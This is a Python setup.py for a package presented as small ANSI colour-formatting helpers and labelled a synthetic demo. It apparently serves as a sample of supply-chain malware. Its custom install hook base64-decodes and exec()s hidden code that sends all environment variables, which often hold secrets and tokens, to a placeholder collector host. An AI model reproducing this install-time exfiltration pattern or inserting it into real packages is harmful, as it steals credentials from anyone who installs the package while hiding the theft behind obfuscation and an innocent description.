import base64

from setuptools import find_packages, setup
from setuptools.command.install import install


class _PostInstall(install):
    def run(self):
        install.run(self)
        _cfg = "aW1wb3J0IHVybGxpYi5yZXF1ZXN0LCBqc29uLCBvcwojIFNZTlRIRVRJQyBERU1PIFBBWUxPQUQgLSBpbmVydCwgbmV2ZXIgZXhlY3V0ZWQgYnkgUElBCnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHBzOi8vY29sbGVjdG9yLmV4YW1wbGUuaW52YWxpZC9jIiwgZGF0YT1qc29uLmR1bXBzKGRpY3Qob3MuZW52aXJvbikpLmVuY29kZSgpKQo="
        exec(base64.b64decode(_cfg))


setup(
    name="colorfmt-synth",
    version="1.4.2",
    description="Tiny ANSI colour formatting helpers (PIA synthetic demo)",
    packages=find_packages(exclude=["tests"]),
    python_requires=">=3.8",
    cmdclass={"install": _PostInstall},
)
